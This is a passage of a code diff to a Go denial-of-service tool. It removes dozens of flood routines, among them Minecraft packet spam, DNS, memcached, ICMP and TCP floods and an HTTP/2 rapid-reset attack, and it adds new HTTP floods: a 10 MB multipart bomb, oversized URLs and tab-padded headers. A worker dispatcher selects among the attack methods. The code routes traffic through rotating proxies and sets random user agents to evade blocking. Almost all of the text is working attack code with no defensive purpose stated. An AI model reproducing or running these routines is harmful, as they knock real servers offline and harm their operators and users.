-    loginStart = append(loginStart, []byte(username)...)
-
-    reqLen := len(loginStart)
-    reqPacket := []byte{byte(reqLen)}
-    reqPacket = append(reqPacket, loginStart...)
-    conn.Write(reqPacket)
-
-    buf := make([]byte, 4096)
-    conn.SetReadDeadline(time.Now().Add(5 * time.Second))
-    conn.Read(buf)
-
-    time.Sleep(time.Duration(120+rand.Intn(120)) * time.Second)
-    recordStatus("Sent")
-    totalSuccess.Add(1)
-    return nil
-}
-
-func mcSpamPacket(targetURL string, stop <-chan struct{}) error {
-    u, err := url.Parse(targetURL)
-    if err != nil {
-        recordStatus("Err")
-        totalErrors.Add(1)
-        return err
-    }
-    host := u.Hostname()
-    port := u.Port()
-    if port == "" {
-        port = "25565"
-    }
-    addr := net.JoinHostPort(host, port)
-
-    var conn net.Conn
-    if len(proxyList) > 0 {
-        proxy := proxyList[rand.Intn(len(proxyList))]
-        pURL, err := url.Parse(proxy)
-        if err != nil {
-            recordStatus("Err")
-            totalErrors.Add(1)
-            return err
-        }
-        conn, err = dialViaProxy("tcp", addr, pURL)
-        if err != nil {
-            recordStatus("Err")
-            totalErrors.Add(1)
-            return err
-        }
-    } else {
-        conn, err = net.DialTimeout("tcp", addr, 15*time.Second)
-        if err != nil {
-            recordStatus("Err")
-            totalErrors.Add(1)
-            return err
-        }
-    }
-    defer conn.Close()
-
-    payload := make([]byte, 256)
-    rand.Read(payload)
-    payload[0] = 0x20
-
-    buf := make([]byte, 5)
-    n := 0
-    for {
-        b := byte(len(payload) >> (uint(n) * 7) & 0x7F)
-        if len(payload)>>(uint(n)*7+7) == 0 {
-            buf[n] = b
-            n++
-            break
-        }
-        buf[n] = b | 0x80
-        n++
-    }
-
-    finalPacket := append(buf[:n], payload...)
-    _, err = conn.Write(finalPacket)
-    if err != nil {
-        recordStatus("Err")
-        totalErrors.Add(1)
-        return err
-    }
-
-    time.Sleep(time.Duration(5+rand.Intn(5)) * time.Second)
-    recordStatus("Sent")
-    totalSuccess.Add(1)
-    return nil
-}
-
-func mcBadPacket(targetURL string, stop <-chan struct{}) error {
-    u, err := url.Parse(targetURL)
-    if err != nil {
-        recordStatus("Err")
-        totalErrors.Add(1)
-        return err
-    }
-    host := u.Hostname()
-    port := u.Port()
-    if port == "" {
-        port = "25565"
-    }
-    addr := net.JoinHostPort(host, port)
-
-    var conn net.Conn
-    if len(proxyList) > 0 {
-        proxy := proxyList[rand.Intn(len(proxyList))]
-        pURL, err := url.Parse(proxy)
-        if err != nil {
-            recordStatus("Err")
-            totalErrors.Add(1)
-            return err
-        }
-        conn, err = dialViaProxy("tcp", addr, pURL)
-        if err != nil {
-            recordStatus("Err")
-            totalErrors.Add(1)
-            return err
-        }
-    } else {
-        conn, err = net.DialTimeout("tcp", addr, 15*time.Second)
-        if err != nil {
-            recordStatus("Err")
-            totalErrors.Add(1)
-            return err
-        }
-    }
-    defer conn.Close()
-
-    payload := make([]byte, 50)
-    rand.Read(payload)
-
-    _, err = conn.Write(payload)
-    if err != nil {
-        recordStatus("Err")
-        totalErrors.Add(1)
-        return err
-    }
-
-    time.Sleep(time.Duration(5+rand.Intn(5)) * time.Second)
-    recordStatus("Sent")
-    totalSuccess.Add(1)
-    return nil
-}
-
-func mcRandomPacket(targetURL string, stop <-chan struct{}) error {
-    u, err := url.Parse(targetURL)
-    if err != nil {
-        recordStatus("Err")
-        totalErrors.Add(1)
-        return err
-    }
-    host := u.Hostname()
-    port := u.Port()
-    if port == "" {
-        port = "25565"
-    }
-    addr := net.JoinHostPort(host, port)
-
-    var conn net.Conn
-    if len(proxyList) > 0 {
-        proxy := proxyList[rand.Intn(len(proxyList))]
-        pURL, err := url.Parse(proxy)
-        if err != nil {
-            recordStatus("Err")
-            totalErrors.Add(1)
-            return err
-        }
-        conn, err = dialViaProxy("tcp", addr, pURL)
-        if err != nil {
-            recordStatus("Err")
-            totalErrors.Add(1)
-            return err
-        }
-    } else {
-        conn, err = net.DialTimeout("tcp", addr, 15*time.Second)
-        if err != nil {
-            recordStatus("Err")
-            totalErrors.Add(1)
-            return err
-        }
-    }
-    defer conn.Close()
-
-    pktSize := 100 + rand.Intn(500)
-    payload := make([]byte, pktSize)
-    rand.Read(payload)
-    payload[0] = byte(rand.Intn(256))
-
-    buf := make([]byte, 5)
-    n := 0
-    for {
-        b := byte(pktSize >> (uint(n) * 7) & 0x7F)
-        if pktSize >>(uint(n)*7+7) == 0 {
-            buf[n] = b
-            n++
-            break
-        }
-        buf[n] = b | 0x80
-        n++
-    }
-
-    finalPacket := append(buf[:n], payload...)
-    _, err = conn.Write(finalPacket)
-    if err != nil {
-        recordStatus("Err")
-        totalErrors.Add(1)
-        return err
-    }
-
-    time.Sleep(time.Duration(5+rand.Intn(5)) * time.Second)
-    recordStatus("Sent")
-    totalSuccess.Add(1)
-    return nil
-}
-
-func mcSlowRead(targetURL string, stop <-chan struct{}) error {
-    u, err := url.Parse(targetURL)
-    if err != nil {
-        recordStatus("Err")
-        totalErrors.Add(1)
-        return err
-    }
-    host := u.Hostname()
-    port := u.Port()
-    if port == "" {
-        port = "25565"
-    }
-    addr := net.JoinHostPort(host, port)
-
-    var conn net.Conn
-    if len(proxyList) > 0 {
-        proxy := proxyList[rand.Intn(len(proxyList))]
-        pURL, err := url.Parse(proxy)
-        if err != nil {
-            recordStatus("Err")
-            totalErrors.Add(1)
-            return err
-        }
-        conn, err = dialViaProxy("tcp", addr, pURL)
-        if err != nil {
-            recordStatus("Err")
-            totalErrors.Add(1)
-            return err
-        }
-    } else {
-        conn, err = net.DialTimeout("tcp", addr, 15*time.Second)
-        if err != nil {
-            recordStatus("Err")
-            totalErrors.Add(1)
-            return err
-        }
-    }
-    defer conn.Close()
-
-    buf := make([]byte, 1)
-    for {
-        select {
-        case <-stop:
-            return nil
-        default:
-        }
-        _, err := conn.Read(buf)
-        if err != nil {
-            recordStatus("Err")
-            totalErrors.Add(1)
-            return err
-        }
-        time.Sleep(time.Duration(1+rand.Intn(3)) * time.Second)
-        recordStatus("Held")
-        totalSuccess.Add(1)
-    }
-}
-
-func tcpSocketExhaust(targetURL string, stop <-chan struct{}) error {
-    u, err := url.Parse(targetURL)
-    if err != nil {
-        recordStatus("Err")
-        totalErrors.Add(1)
-        return err
-    }
-    host := u.Hostname()
-    port := u.Port()
-    if port == "" {
-        port = "80"
-    }
-    addr := net.JoinHostPort(host, port)
-
-    var conn net.Conn
-    if len(proxyList) > 0 {
-        proxy := proxyList[rand.Intn(len(proxyList))]
-        pURL, err := url.Parse(proxy)
-        if err != nil {
-            recordStatus("Err")
-            totalErrors.Add(1)
-            return err
-        }
-        conn, err = dialViaProxy("tcp", addr, pURL)
-        if err != nil {
-            recordStatus("Err")
-            totalErrors.Add(1)
-            return err
-        }
-    } else {
-        conn, err = net.DialTimeout("tcp", addr, 5*time.Second)
-        if err != nil {
-            recordStatus("Err")
-            totalErrors.Add(1)
-            return err
-        }
-    }
-    defer conn.Close()
-
-    time.Sleep(time.Duration(30+rand.Intn(60)) * time.Second)
-    recordStatus("Sent")
-    totalSuccess.Add(1)
-    return nil
-}
-
-func dnsNXFlood(targetURL string, stop <-chan struct{}) error {
-    u, err := url.Parse(targetURL)
-    if err != nil {
-        recordStatus("Err")
-        totalErrors.Add(1)
-        return err
-    }
-    host := u.Hostname()
-
-    var conn net.Conn
-    if len(proxyList) > 0 {
-        proxy := proxyList[rand.Intn(len(proxyList))]
-        pURL, err := url.Parse(proxy)
-        if err != nil {
-            recordStatus("Err")
-            totalErrors.Add(1)
-            return err
-        }
-        conn, err = dialViaProxy("tcp", net.JoinHostPort(pURL.Hostname(), "53"), pURL)
-        if err != nil {
-            recordStatus("Err")
-            totalErrors.Add(1)
-            return err
-        }
-    } else {
-        conn, err = net.DialTimeout("udp", net.JoinHostPort(host, "53"), 5*time.Second)
-        if err != nil {
-            conn, err = net.DialTimeout("tcp", net.JoinHostPort(host, "53"), 5*time.Second)
-            if err != nil {
-                recordStatus("Err")
-                totalErrors.Add(1)
-                return err
-            }
-        }
-    }
-    defer conn.Close()
-
-    randDomain := randString(30) + "." + host
-    queryData := []byte{0xAA, 0xBB, 0x01, 0x00, 0x00, 0x01, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00}
-    parts := strings.Split(randDomain, ".")
-    for _, p := range parts {
-        queryData = append(queryData, byte(len(p)))
-        queryData = append(queryData, []byte(p)...)
-    }
-    queryData = append(queryData, 0x00, 0x00, 0x01, 0x00, 0x01)
-
-    _, err = conn.Write(queryData)
-    if err != nil {
-        recordStatus("Err")
-        totalErrors.Add(1)
-        return err
-    }
-
-    recordStatus("Sent")
-    totalSuccess.Add(1)
-    return nil
-}
-
-func udpDNSFlood(targetURL string, stop <-chan struct{}) error {
-    u, err := url.Parse(targetURL)
-    if err != nil {
-        recordStatus("Err")
-        totalErrors.Add(1)
-        return err
-    }
-    host := u.Hostname()
-
-    conn, err := net.Dial("udp", net.JoinHostPort(host, "53"))
-    if err != nil {
-        recordStatus("Err")
-        totalErrors.Add(1)
-        return err
-    }
-    defer conn.Close()
-
-    for {
-        select {
-        case <-stop:
-            return nil
-        default:
-        }
-        randDomain := randString(10) + "." + host
-        queryData := []byte{0xAA, 0xBB, 0x01, 0x00, 0x00, 0x01, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00}
-        parts := strings.Split(randDomain, ".")
-        for _, p := range parts {
-            queryData = append(queryData, byte(len(p)))
-            queryData = append(queryData, []byte(p)...)
-        }
-        queryData = append(queryData, 0x00, 0x00, 0x01, 0x00, 0x01)
-
-        _, err := conn.Write(queryData)
-        if err != nil {
-            recordStatus("Err")
-            totalErrors.Add(1)
-            return err
-        }
-        recordStatus("Sent")
-        totalSuccess.Add(1)
-    }
-}
-
-func udpMemcachedFlood(targetURL string, stop <-chan struct{}) error {
-    u, err := url.Parse(targetURL)
-    if err != nil {
-        recordStatus("Err")
-        totalErrors.Add(1)
-        return err
-    }
-    host := u.Hostname()
-
-    conn, err := net.Dial("udp", net.JoinHostPort(host, "11211"))
-    if err != nil {
-        recordStatus("Err")
-        totalErrors.Add(1)
-        return err
-    }
-    defer conn.Close()
-
-    payload := []byte{0x00, 0x00, 0x00, 0x00, 0x00, 0x01, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x01}
-    _, err = conn.Write(payload)
-    if err != nil {
-        recordStatus("Err")
-        totalErrors.Add(1)
-        return err
-    }
-    recordStatus("Sent")
-    totalSuccess.Add(1)
-    return nil
-}
-
-func icmpLargePacket(targetURL string, stop <-chan struct{}) error {
-    u, err := url.Parse(targetURL)
-    if err != nil {
-        recordStatus("Err")
-        totalErrors.Add(1)
-        return err
-    }
-    host := u.Hostname()
-    ipAddr, err := net.ResolveIPAddr("ip", host)
-    if err != nil {
-        recordStatus("Err")
-        totalErrors.Add(1)
-        return err
-    }
-
-    conn, err := net.DialIP("ip4:icmp", nil, ipAddr)
-    if err != nil {
-        recordStatus("Err")
-        totalErrors.Add(1)
-        return err
-    }
-    defer conn.Close()
-
-    icmpPayload := make([]byte, 1400)
-    rand.Read(icmpPayload)
-    icmpPayload[0] = 8
-
-    _, err = conn.Write(icmpPayload)
-    if err != nil {
-        recordStatus("Err")
-        totalErrors.Add(1)
-        return err
-    }
-    recordStatus("Sent")
-    totalSuccess.Add(1)
-    return nil
-}
-
-func tcpUrgFlood(targetURL string, stop <-chan struct{}) error {
-    u, err := url.Parse(targetURL)
-    if err != nil {
-        recordStatus("Err")
-        totalErrors.Add(1)
-        return err
-    }
-    host := u.Hostname()
-    port := u.Port()
-    if port == "" {
-        port = "80"
-    }
-    addr := net.JoinHostPort(host, port)
-
-    conn, err := net.DialTimeout("tcp", addr, 5*time.Second)
-    if err != nil {
-        recordStatus("Err")
-        totalErrors.Add(1)
-        return err
-    }
-    defer conn.Close()
-
-    payload := make([]byte, 1024)
-    rand.Read(payload)
-
-    _, err = conn.Write(payload)
-    if err != nil {
-        recordStatus("Err")
-        totalErrors.Add(1)
-        return err
-    }
-    recordStatus("Sent")
-    totalSuccess.Add(1)
-    return nil
-}
-
-func tcpOOBData(targetURL string, stop <-chan struct{}) error {
-    u, err := url.Parse(targetURL)
-    if err != nil {
-        recordStatus("Err")
-        totalErrors.Add(1)
-        return err
-    }
-    host := u.Hostname()
-    port := u.Port()
-    if port == "" {
-        port = "80"
-    }
-    addr := net.JoinHostPort(host, port)
-
-    conn, err := net.DialTimeout("tcp", addr, 5*time.Second)
-    if err != nil {
-        recordStatus("Err")
-        totalErrors.Add(1)
-        return err
-    }
-    defer conn.Close()
-
-    payload := make([]byte, 1)
-    rand.Read(payload)
-
-    _, err = conn.Write(payload)
-    if err != nil {
-        recordStatus("Err")
-        totalErrors.Add(1)
-        return err
-    }
-
-    recordStatus("Sent")
-    totalSuccess.Add(1)
-    return nil
-}
-
-func tcpFinFlood(targetURL string, stop <-chan struct{}) error {
-    u, err := url.Parse(targetURL)
-    if err != nil {
-        recordStatus("Err")
-        totalErrors.Add(1)
-        return err
-    }
-    host := u.Hostname()
-    port := u.Port()
-    if port == "" {
-        port = "80"
-    }
-    addr := net.JoinHostPort(host, port)
-
-    conn, err := net.DialTimeout("tcp", addr, 5*time.Second)
-    if err != nil {
-        recordStatus("Err")
-        totalErrors.Add(1)
-        return err
-    }
-    defer conn.Close()
-
-    payload := make([]byte, 64)
-    rand.Read(payload)
-
-    _, err = conn.Write(payload)
-    if err != nil {
-        recordStatus("Err")
-        totalErrors.Add(1)
-        return err
-    }
-
-    tcpConn, ok := conn.(*net.TCPConn)
-    if ok {
-        tcpConn.CloseWrite()
-    }
-
-    recordStatus("Sent")
-    totalSuccess.Add(1)
-    return nil
-}
-
-func tcpHalfOpen(targetURL string, stop <-chan struct{}) error {
-    u, err := url.Parse(targetURL)
-    if err != nil {
-        recordStatus("Err")
-        totalErrors.Add(1)
-        return err
-    }
-    host := u.Hostname()
-    port := u.Port()
-    if port == "" {
-        port = "80"
-    }
-    addr := net.JoinHostPort(host, port)
-
-    conn, err := net.DialTimeout("tcp", addr, 5*time.Second)
-    if err != nil {
-        recordStatus("Err")
-        totalErrors.Add(1)
-        return err
-    }
-    defer conn.Close()
-
-    time.Sleep(time.Duration(10+rand.Intn(20)) * time.Second)
-    recordStatus("Sent")
-    totalSuccess.Add(1)
-    return nil
-}
-
-func tcpFragmented(targetURL string, stop <-chan struct{}) error {
-    u, err := url.Parse(targetURL)
-    if err != nil {
-        recordStatus("Err")
-        totalErrors.Add(1)
-        return err
-    }
-    host := u.Hostname()
-    port := u.Port()
-    if port == "" {
-        port = "80"
-    }
-    addr := net.JoinHostPort(host, port)
-
-    conn, err := net.DialTimeout("tcp", addr, 5*time.Second)
-    if err != nil {
-        recordStatus("Err")
-        totalErrors.Add(1)
-        return err
-    }
-    defer conn.Close()
-
-    payload := make([]byte, 1500)
-    rand.Read(payload)
-
-    chunkSize := 10
-    for i := 0; i < len(payload); i += chunkSize {
-        end := i + chunkSize
-        if end > len(payload) {
-            end = len(payload)
-        }
-        _, err := conn.Write(payload[i:end])
-        if err != nil {
-            recordStatus("Err")
-            totalErrors.Add(1)
-            return err
-        }
-        time.Sleep(time.Duration(10+rand.Intn(50)) * time.Millisecond)
-    }
-    recordStatus("Sent")
-    totalSuccess.Add(1)
-    return nil
-}
-
-func tcpLargeConnect(targetURL string, stop <-chan struct{}) error {
-    u, err := url.Parse(targetURL)
-    if err != nil {
-        recordStatus("Err")
-        totalErrors.Add(1)
-        return err
-    }
-    host := u.Hostname()
-    port := u.Port()
-    if port == "" {
-        port = "80"
-    }
-    addr := net.JoinHostPort(host, port)
-
-    var conn net.Conn
-    if len(proxyList) > 0 {
-        proxy := proxyList[rand.Intn(len(proxyList))]
-        pURL, err := url.Parse(proxy)
-        if err != nil {
-            recordStatus("Err")
-            totalErrors.Add(1)
-            return err
-        }
-        conn, err = dialViaProxy("tcp", addr, pURL)
-        if err != nil {
-            recordStatus("Err")
-            totalErrors.Add(1)
-            return err
-        }
-    } else {
-        conn, err = net.DialTimeout("tcp", addr, 5*time.Second)
-        if err != nil {
-            recordStatus("Err")
-            totalErrors.Add(1)
-            return err
-        }
-    }
-    defer conn.Close()
-
-    payload := make([]byte, 65535)
-    rand.Read(payload)
-    _, err = conn.Write(payload)
-    if err != nil {
-        recordStatus("Err")
-        totalErrors.Add(1)
-        return err
-    }
-    recordStatus("Sent")
-    totalSuccess.Add(1)
-    return nil
-}
-
 func httpEventStream(targetURL string, client *http.Client, stop <-chan struct{}) error {
     req, err := http.NewRequest("GET", targetURL, nil)
     if err != nil {
@@ -5648,7 +3031,9 @@ func httpEventStream(targetURL string, client *http.Client, stop <-chan struct{}
     defer resp.Body.Close()
     recordStatus(strconv.Itoa(resp.StatusCode))
 
-    buf := make([]byte, 1)
+    buf := bufPool.Get().([]byte)
+    defer bufPool.Put(buf)
+
     for {
         select {
         case <-stop:
@@ -5659,7 +3044,7 @@ func httpEventStream(targetURL string, client *http.Client, stop <-chan struct{}
         if err != nil {
             return nil
         }
-        time.Sleep(time.Duration(500+rand.Intn(1000)) * time.Millisecond)
+        time.Sleep(time.Duration(500+rand.IntN(1000)) * time.Millisecond)
         recordStatus("Held")
         totalSuccess.Add(1)
     }
@@ -5965,7 +3350,7 @@ func httpH2ContinuationBomb(targetURL string, stop <-chan struct{}) error {
 
 func httpMixHeavy(targetURL string, client *http.Client) error {
     var sb strings.Builder
-    depth := 100 + rand.Intn(200)
+    depth := 100 + rand.IntN(200)
 
     sb.WriteString(`<?xml version="1.0"?><root>`)
     for i := 0; i < depth; i++ {
@@ -5984,7 +3369,7 @@ func httpMixHeavy(targetURL string, client *http.Client) error {
     body := sb.String()
     contentType := "application/xml"
 
-    if rand.Intn(2) == 0 {
+    if rand.IntN(2) == 0 {
         contentType = "text/xml; charset=utf-8"
     }
 
@@ -6017,18 +3402,18 @@ func httpMixBunchOf(targetURL string, client *http.Client) error {
     var buf bytes.Buffer
     boundary := "----WebKitFormBoundary" + randString(16)
 
-    numParts := 200 + rand.Intn(300)
+    numParts := 200 + rand.IntN(300)
 
     for i := 0; i < numParts; i++ {
         fmt.Fprintf(&buf, "--%s\r\n", boundary)
-        if rand.Intn(2) == 0 {
+        if rand.IntN(2) == 0 {
             fmt.Fprintf(&buf, "Content-Disposition: form-data; name=\"%s\"\r\n\r\n", randString(20))
             buf.WriteString(randString(500))
             buf.WriteString("\r\n")
         } else {
             fmt.Fprintf(&buf, "Content-Disposition: form-data; name=\"%s\"; filename=\"%s.bin\"\r\n", randString(10), randString(10))
             buf.WriteString("Content-Type: application/octet-stream\r\n\r\n")
-            binaryData := make([]byte, 1024+rand.Intn(4096))
+            binaryData := make([]byte, 1024+rand.IntN(4096))
             rand.Read(binaryData)
             buf.Write(binaryData)
             buf.WriteString("\r\n")
@@ -6067,7 +3452,7 @@ func httpMixRegex(targetURL string, client *http.Client) error {
     var body string
     var contentType string
 
-    switch rand.Intn(3) {
+    switch rand.IntN(3) {
     case 0:
         body = fmt.Sprintf(`{"email":"%s@example.com","user":"%s","pass":"%s"}`, redosCore, redosCore, redosCore)
         contentType = "application/json"
@@ -6120,16 +3505,16 @@ func (r *chunkedSlowReader) Read(p []byte) (int, error) {
         return 0, io.EOF
     }
 
-    time.Sleep(time.Duration(1000+rand.Intn(2000)) * time.Millisecond)
+    time.Sleep(time.Duration(1000+rand.IntN(2000)) * time.Millisecond)
 
-    n := copy(p, r.data[r.pos:r.pos+1+rand.Intn(1)])
+    n := copy(p, r.data[r.pos:r.pos+1+rand.IntN(1)])
     r.pos += n
     return n, nil
 }
 
 func httpMixChunkedSlow(targetURL string, client *http.Client, stop <-chan struct{}) error {
     var body string
-    switch rand.Intn(3) {
+    switch rand.IntN(3) {
     case 0:
         body = fmt.Sprintf(`{"data":"%s","token":"%s"}`, randString(5000), randString(64))
     case 1:
@@ -6171,117 +3556,6 @@ func httpMixChunkedSlow(targetURL string, client *http.Client, stop <-chan struc
     recordStatus(strconv.Itoa(resp.StatusCode))
     totalSuccess.Add(1)
     return nil
-}
-
-func httpRapidResetAdvanced(targetURL string, stop <-chan struct{}) error {
-    u, err := url.Parse(targetURL)
-    if err != nil {
-        recordStatus("Err")
-        totalErrors.Add(1)
-        return err
-    }
-
-    host := u.Hostname()
-    port := u.Port()
-    if port == "" {
-        if u.Scheme == "https" {
-            port = "443"
-        } else {
-            port = "80"
-        }
-    }
-    addr := net.JoinHostPort(host, port)
-
-    rawConn, err := net.DialTimeout("tcp", addr, 5*time.Second)
-    if err != nil {
-        recordStatus("Err")
-        totalErrors.Add(1)
-        return err
-    }
-
-    tlsConn := tls.Client(rawConn, &tls.Config{
-        ServerName:         host,
-        NextProtos:         []string{"h2"},
-        InsecureSkipVerify: true,
-    })
-    if err := tlsConn.Handshake(); err != nil {
-        rawConn.Close()
-        recordStatus("Err")
-        totalErrors.Add(1)
-        return err
-    }
-    defer tlsConn.Close()
-
-    if tlsConn.ConnectionState().NegotiatedProtocol != "h2" {
-        recordStatus("Err")
-        totalErrors.Add(1)
-        return fmt.Errorf("h2 not negotiated")
-    }
-
-    if _, err := tlsConn.Write([]byte(http2.ClientPreface)); err != nil {
-        recordStatus("Err")
-        totalErrors.Add(1)
-        return err
-    }
-
-    bw := bufio.NewWriterSize(tlsConn, 1<<20)
-    framer := http2.NewFramer(bw, tlsConn)
-    framer.AllowIllegalWrites = true
-
-    framer.WriteSettings(
-        http2.Setting{ID: http2.SettingMaxConcurrentStreams, Val: 1<<31 - 1},
-        http2.Setting{ID: http2.SettingInitialWindowSize, Val: 1<<31 - 1},
-    )
-    bw.Flush()
-
-    var streamID uint32 = 1
-    var hdrBuf bytes.Buffer
-    enc := hpack.NewEncoder(&hdrBuf)
-    path := u.RequestURI()
-    if path == "" {
-        path = "/"
-    }
-
-    for {
-        select {
-        case <-stop:
-            return nil
-        default:
-        }
-
-        hdrBuf.Reset()
-        enc.WriteField(hpack.HeaderField{Name: ":method", Value: "GET"})
-        enc.WriteField(hpack.HeaderField{Name: ":path", Value: path})
-        enc.WriteField(hpack.HeaderField{Name: ":scheme", Value: "https"})
-        enc.WriteField(hpack.HeaderField{Name: ":authority", Value: u.Host})
-        enc.WriteField(hpack.HeaderField{Name: "user-agent", Value: randUA()})
-
-        if err := framer.WriteHeaders(http2.HeadersFrameParam{
-            StreamID:      streamID,
-            BlockFragment: hdrBuf.Bytes(),
-            EndStream:     true,
-            EndHeaders:    true,
-        }); err != nil {
-            return err
-        }
-
-        if err := framer.WriteRSTStream(streamID, http2.ErrCodeCancel); err != nil {
-            return err
-        }
-
-        streamID += 2
-        if streamID >= 1<<31-1 {
-            bw.Flush()
-            return nil
-        }
-
-        if streamID%100 == 0 {
-            bw.Flush()
-        }
-
-        recordStatus("RST")
-        totalSuccess.Add(1)
-    }
 }
 
 func httpCacheBypass(targetURL string, client *http.Client) error {
@@ -6380,6 +3654,100 @@ func httpSlowPostBomb(targetURL string, client *http.Client, stop <-chan struct{
     return nil
 }
 
+func httpMultipartBomb(targetURL string, client *http.Client) error {
+    var buf bytes.Buffer
+    boundary := "----WebKitFormBoundary" + randString(16)
+    fmt.Fprintf(&buf, "--%s\r\n", boundary)
+    fmt.Fprintf(&buf, "Content-Disposition: form-data; name=\"%s\"; filename=\"%s.bin\"\r\n", randString(10), randString(10))
+    fmt.Fprintf(&buf, "Content-Type: application/octet-stream\r\n\r\n")
+    
+    largeData := make([]byte, 10*1024*1024)
+    rand.Read(largeData)
+    buf.Write(largeData)
+    
+    fmt.Fprintf(&buf, "\r\n--%s--\r\n", boundary)
+
+    body := buf.Bytes()
+    req, err := http.NewRequest("POST", targetURL, bytes.NewReader(body))
+    if err != nil {
+        recordStatus("Err")
+        totalErrors.Add(1)
+        return err
+    }
+    req.Header.Set("Content-Type", "multipart/form-data; boundary="+boundary)
+    req.Header.Set("Content-Length", strconv.Itoa(len(body)))
+    req.Header.Set("User-Agent", randUA())
+    req.Header.Set("Accept", "*/*")
+
+    resp, err := client.Do(req)
+    if err != nil {
+        recordStatus("Err")
+        totalErrors.Add(1)
+        return err
+    }
+    io.Copy(io.Discard, resp.Body)
+    resp.Body.Close()
+    recordStatus(strconv.Itoa(resp.StatusCode))
+    totalSuccess.Add(1)
+    return nil
+}
+
+func httpLongURL(targetURL string, client *http.Client) error {
+    sep := "?"
+    if strings.Contains(targetURL, "?") {
+        sep = "&"
+    }
+    fullURL := targetURL + sep + randString(16384)
+
+    req, err := http.NewRequest("GET", fullURL, nil)
+    if err != nil {
+        recordStatus("Err")
+        totalErrors.Add(1)
+        return err
+    }
+    req.Header.Set("User-Agent", randUA())
+    req.Header.Set("Accept", "*/*")
+
+    resp, err := client.Do(req)
+    if err != nil {
+        recordStatus("Err")
+        totalErrors.Add(1)
+        return err
+    }
+    io.Copy(io.Discard, resp.Body)
+    resp.Body.Close()
+    recordStatus(strconv.Itoa(resp.StatusCode))
+    totalSuccess.Add(1)
+    return nil
+}
+
+func httpHeaderTab(targetURL string, client *http.Client) error {
+    req, err := http.NewRequest("GET", targetURL, nil)
+    if err != nil {
+        recordStatus("Err")
+        totalErrors.Add(1)
+        return err
+    }
+    req.Header.Set("User-Agent", randUA())
+    req.Header.Set("Accept", "*/*")
+    
+    for i := 0; i < 50; i++ {
+        req.Header.Add("X-"+randString(8), "\t"+randString(1024)+"\t")
+    }
+
+    resp, err := client.Do(req)
+    if err != nil {
+        recordStatus("Err")
+        totalErrors.Add(1)
+        return err
+    }
+    io.Copy(io.Discard, resp.Body)
+    resp.Body.Close()
+    recordStatus(strconv.Itoa(resp.StatusCode))
+    totalSuccess.Add(1)
+    return nil
+}
+
 func Worker(id int, targetURL string, method string, clients []*http.Client, stop <-chan struct{}, verbose bool, rateMS int) {
     client := clients[id%len(clients)]
     for {
@@ -6399,8 +3767,8 @@ func Worker(id int, targetURL string, method string, clients []*http.Client, sto
             err = httpRudy(targetURL, client, stop)
         case "apiflood":
             err = httpAPIFlood(targetURL, client)
-        case "rapidreset":
-            err = httpRapidReset(targetURL, stop)
+        case "rapidreset_adv":
+            err = httpRapidResetAdvanced(targetURL, stop)
         case "wsflood":
             err = wsFlood(targetURL, stop)
         case "slowloris":
@@ -6433,30 +3801,6 @@ func Worker(id int, targetURL string, method string, clients []*http.Client, sto
             err = httpSmuggleCLTE(targetURL, stop)
         case "pingback":
             err = httpPingback(targetURL, client)
-        case "tcp_connect":
-            err = tcpConnect(targetURL, stop)
-        case "tcp_slow":
-            err = tcpSlow(targetURL, stop)
-        case "tcp_payload":
-            err = tcpPayload(targetURL, stop)
-        case "udp_flood":
-            err = udpFlood(targetURL, stop)
-        case "mc_ping":
-            err = mcPingFlood(targetURL, stop)
-        case "mc_bot":
-            err = mcBotJoin(targetURL, stop)
-        case "mc_bigpacket":
-            err = mcBigPacket(targetURL, stop)
-        case "mc_legacy":
-            err = mcLegacyPing(targetURL, stop)
-        case "mc_nullping":
-            err = mcNullPing(targetURL, stop)
-        case "mc_handshake_flood":
-            err = mcHandshakeFlood(targetURL, stop)
-        case "mc_hold":
-            err = mcHold(targetURL, stop)
-        case "mc_data":
-            err = mcData(targetURL, stop)
         case "httpoptions":
             err = httpOptionsFlood(targetURL, client)
         case "httpdelete":
@@ -6473,26 +3817,6 @@ func Worker(id int, targetURL string, method string, clients []*http.Client, sto
             err = httpPathTraversal(targetURL, client)
         case "smuggle_tete":
             err = httpSmuggleTete(targetURL, stop)
-        case "dns_query":
-            err = dnsQuery(targetURL, stop)
-        case "icmp_flood":
-            err = icmpFlood(targetURL, stop)
-        case "ack_flood":
-            err = ackFlood(targetURL, stop)
-        case "syn_flood":
-            err = synFlood(targetURL, stop)
-        case "mc_ext_login":
-            err = mcExtLogin(targetURL, stop)
-        case "mc_bungee":
-            err = mcBungee(targetURL, stop)
-        case "mc_varint":
-            err = mcVarIntFlood(targetURL, stop)
-        case "mc_ping_var":
-            err = mcPingVariation(targetURL, stop)
-        case "mc_data_spam":
-            err = mcDataSpam(targetURL, stop)
-        case "mc_profile_flood":
-            err = mcProfileFlood(targetURL, stop)
         case "http_empty":
             err = httpEmptyFlood(targetURL, client)
         case "http_invalid_req":
@@ -6515,8 +3839,6 @@ func Worker(id int, targetURL string, method string, clients []*http.Client, sto
             err = httpAuthFlood(targetURL, client)
         case "http_h2_flood":
             err = httpH2Flood(targetURL, stop)
-        case "udp_amp":
-            err = udpAmpFlood(targetURL, stop)
         case "http_json":
             err = httpJsonFlood(targetURL, client)
         case "http_multipart":
@@ -6535,38 +3857,6 @@ func Worker(id int, targetURL string, method string, clients []*http.Client, sto
             err = httpFormBomb(targetURL, client)
         case "http_ntlm":
             err = httpNTLMFlood(targetURL, client)
-        case "mc_account_fill":
-            err = mcAccountFill(targetURL, stop)
-        case "mc_spam_pkt":
-            err = mcSpamPacket(targetURL, stop)
-        case "mc_bad_pkt":
-            err = mcBadPacket(targetURL, stop)
-        case "mc_random_pkt":
-            err = mcRandomPacket(targetURL, stop)
-        case "mc_slow_read":
-            err = mcSlowRead(targetURL, stop)
-        case "tcp_socket_exhaust":
-            err = tcpSocketExhaust(targetURL, stop)
-        case "dns_nx":
-            err = dnsNXFlood(targetURL, stop)
-        case "udp_dns":
-            err = udpDNSFlood(targetURL, stop)
-        case "udp_memcached":
-            err = udpMemcachedFlood(targetURL, stop)
-        case "icmp_large":
-            err = icmpLargePacket(targetURL, stop)
-        case "tcp_urg":
-            err = tcpUrgFlood(targetURL, stop)
-        case "tcp_oob":
-            err = tcpOOBData(targetURL, stop)
-        case "tcp_fin":
-            err = tcpFinFlood(targetURL, stop)
-        case "tcp_half_open":
-            err = tcpHalfOpen(targetURL, stop)
